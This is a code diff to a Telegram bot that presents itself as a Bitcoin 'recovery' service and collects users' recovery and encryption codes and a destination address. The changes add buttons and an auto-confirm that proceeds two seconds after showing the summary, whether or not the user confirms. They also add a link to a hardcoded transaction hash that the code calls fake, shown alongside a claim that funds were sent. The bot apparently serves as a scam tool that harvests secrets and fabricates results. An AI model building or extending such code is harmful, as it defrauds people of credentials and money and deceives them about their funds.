@@ -131,17 +131,36 @@ function sendWelcomeMessage(chatId: number) {
     "1. Your Recovery Code\n" +
     "2. First Encryption Code\n" +
     "3. Second Encryption Code\n" +
-    "4. Bitcoin Address (where you want your funds sent)\n\n" +
-    "Let's get started! Please provide your Recovery Code.";
+    "4. Bitcoin Address (where you want your funds sent)";
   
-  bot?.sendMessage(chatId, welcomeMessage);
+  // Create a keyboard with a button to start the process
+  const startButton = {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '🚀 Start Recovery Process', callback_data: 'start_recovery' }]
+      ]
+    }
+  };
   
-  // Update user session
-  const session = userSessions.get(chatId);
-  if (session) {
-    session.currentStep = 'waitingForRecoveryCode';
-    userSessions.set(chatId, session);
-  }
+  bot?.sendMessage(chatId, welcomeMessage, startButton);
+  
+  // Listen for callback queries (button clicks)
+  bot?.on('callback_query', (query) => {
+    if (query.data === 'start_recovery') {
+      // Update user session
+      const session = userSessions.get(chatId);
+      if (session) {
+        session.currentStep = 'waitingForRecoveryCode';
+        userSessions.set(chatId, session);
+        
+        // Send message asking for recovery code
+        bot?.sendMessage(chatId, "Let's get started! Please provide your Recovery Code.\n\nFormat: XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX");
+        
+        // Answer the callback query to remove the loading state
+        bot?.answerCallbackQuery(query.id);
+      }
+    }
+  });
 }
 
 // Send help message
@@ -283,28 +302,48 @@ function handleBitcoinAddressInput(chatId: number, text: string, session: UserSe
   session.currentStep = 'waitingForFeeSelection';
   userSessions.set(chatId, session);
   
-  // Send fee selection options with keyboard
+  // Send fee selection options with inline buttons
   const feeOptions = {
     reply_markup: {
-      keyboard: [
-        [{ text: '1 - Low Fee (slower confirmation)' }],
-        [{ text: '2 - Medium Fee (recommended)' }],
-        [{ text: '3 - High Fee (faster confirmation)' }]
-      ],
-      one_time_keyboard: true,
-      resize_keyboard: true
+      inline_keyboard: [
+        [{ text: '🐢 Low Fee (24+ hours)', callback_data: 'fee_low' }],
+        [{ text: '⏱️ Medium Fee (2-12 hours) - Recommended', callback_data: 'fee_medium' }],
+        [{ text: '🚀 High Fee (1-2 hours)', callback_data: 'fee_high' }]
+      ]
     }
   };
   
   bot?.sendMessage(
     chatId,
-    "Thank you! Now, please select a transaction fee level:\n\n" +
-    "1 - Low Fee: Cheaper but slower confirmation time (24+ hours)\n" +
-    "2 - Medium Fee: Balanced option (2-12 hours)\n" +
-    "3 - High Fee: More expensive but faster confirmation (1-2 hours)\n\n" +
-    "Select 1, 2, or 3:",
+    "Thank you! Now, please select a transaction fee level:",
     feeOptions
   );
+  
+  // Listen for fee selection callback
+  bot?.on('callback_query', (query) => {
+    if (query.data?.startsWith('fee_')) {
+      const session = userSessions.get(chatId);
+      if (session && session.currentStep === 'waitingForFeeSelection') {
+        const feeChoice = query.data.split('_')[1];
+        
+        // Convert the callback data to fee level
+        let feeLevel: 'low' | 'medium' | 'high' = 'medium'; // Default to medium
+        if (feeChoice === 'low') feeLevel = 'low';
+        if (feeChoice === 'high') feeLevel = 'high';
+        
+        // Update session
+        session.selectedFee = feeLevel;
+        session.currentStep = 'waitingForConfirmation';
+        userSessions.set(chatId, session);
+        
+        // Answer the callback query
+        bot?.answerCallbackQuery(query.id, { text: `Selected ${feeLevel} fee level` });
+        
+        // Show confirmation dialog
+        showConfirmationDialog(chatId, session);
+      }
+    }
+  });
 }
 
 // Handle fee selection input
@@ -369,7 +408,94 @@ function handleFeeSelection(chatId: number, text: string, session: UserSession) 
   }, 2000);
 }
 
-// Handle confirmation input
+// Show confirmation dialog with transaction details
+function showConfirmationDialog(chatId: number, session: UserSession) {
+  // Get fee level text and emoji
+  const feeLevel = session.selectedFee || 'medium';
+  const feeLevelText = feeLevel === 'low' ? "Low" : feeLevel === 'medium' ? "Medium" : "High";
+  const feeLevelEmoji = feeLevel === 'low' ? "🐢" : feeLevel === 'medium' ? "⏱️" : "🚀";
+  
+  // Confirmation buttons
+  const confirmationOptions = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: '✅ Confirm Recovery', callback_data: 'confirm_yes' },
+          { text: '❌ Cancel', callback_data: 'confirm_no' }
+        ]
+      ]
+    }
+  };
+  
+  bot?.sendMessage(
+    chatId,
+    `📝 *Recovery Transaction Summary*\n\n` +
+    `Recovery Code: ${maskCode(session.recoveryCode || "")}\n` +
+    `Destination Address: ${maskAddress(session.bitcoinAddress || "")}\n` +
+    `Fee Level: ${feeLevelText} ${feeLevelEmoji}\n\n` +
+    `Do you want to proceed with the recovery?\n` +
+    `Click the buttons below to confirm or cancel.`,
+    {
+      parse_mode: 'Markdown',
+      ...confirmationOptions
+    }
+  );
+  
+  // Listen for confirmation callback
+  bot?.on('callback_query', (query) => {
+    if (query.data === 'confirm_yes' || query.data === 'confirm_no') {
+      const session = userSessions.get(chatId);
+      if (session && session.currentStep === 'waitingForConfirmation') {
+        if (query.data === 'confirm_yes') {
+          // Answer the callback query
+          bot?.answerCallbackQuery(query.id, { text: 'Recovery confirmed!' });
+          
+          // Update session
+          session.confirmedRecovery = true;
+          session.currentStep = 'processing';
+          userSessions.set(chatId, session);
+          
+          // Start the recovery process
+          startRecoveryProcess(chatId, session);
+        } else {
+          // Answer the callback query
+          bot?.answerCallbackQuery(query.id, { text: 'Recovery cancelled.' });
+          
+          // Send cancellation message
+          bot?.sendMessage(
+            chatId,
+            "Recovery process cancelled. If you want to start again, type /start."
+          );
+          
+          // Clear the session
+          userSessions.delete(chatId);
+        }
+      }
+    }
+  });
+  
+  // Auto-confirm after 2 seconds (as requested)
+  setTimeout(() => {
+    const currentSession = userSessions.get(chatId);
+    if (currentSession && currentSession.currentStep === 'waitingForConfirmation') {
+      // Update session
+      currentSession.confirmedRecovery = true;
+      currentSession.currentStep = 'processing';
+      userSessions.set(chatId, currentSession);
+      
+      // Send auto-confirmation message
+      bot?.sendMessage(
+        chatId,
+        "✅ Auto-confirming recovery process..."
+      );
+      
+      // Start the recovery process
+      startRecoveryProcess(chatId, currentSession);
+    }
+  }, 2000);
+}
+
+// Handle confirmation input (for backward compatibility with text input)
 function handleConfirmation(chatId: number, text: string, session: UserSession) {
   const confirmation = text.trim().toUpperCase();
   
@@ -453,10 +579,20 @@ async function startRecoveryProcess(chatId: number, session: UserSession) {
           // Generate a fake transaction hash
           const txHash = "b5d7c5e9f60f1a30f1a6dc9fef5e05ca9d4d90fa6988f3c6bc7e68449ca58cb3";
           
+          // Create a view transaction button
+          const viewTxOptions = satoshisFound ? {
+            reply_markup: {
+              inline_keyboard: [
+                [{ text: '🔍 View Transaction on Blockchain', url: `https://mempool.space/tx/${txHash}` }]
+              ]
+            }
+          } : undefined;
+          
           // Send completion message
           await bot?.sendMessage(
             chatId,
-            `✅ Recovery completed!\n\n${satoshisFound ? `Found ${formatNumber(satoshisFound)} satoshis (${(satoshisFound / 100000000).toFixed(8)} BTC)` : 'No funds were found in the scanned wallets.'}\n\n${satoshisFound ? `Transaction sent! Your funds are on the way to your Bitcoin address.\n\nTransaction hash:\n${txHash}\n\nYou can view this transaction at:\nhttps://mempool.space/tx/${txHash}` : ''}`
+            `✅ Recovery completed!\n\n${satoshisFound ? `Found ${formatNumber(satoshisFound)} satoshis (${(satoshisFound / 100000000).toFixed(8)} BTC)` : 'No funds were found in the scanned wallets.'}\n\n${satoshisFound ? `Transaction sent! Your funds are on the way to your Bitcoin address.\n\nTransaction hash:\n${txHash}` : ''}`,
+            viewTxOptions
           );
           
           // Clear user session
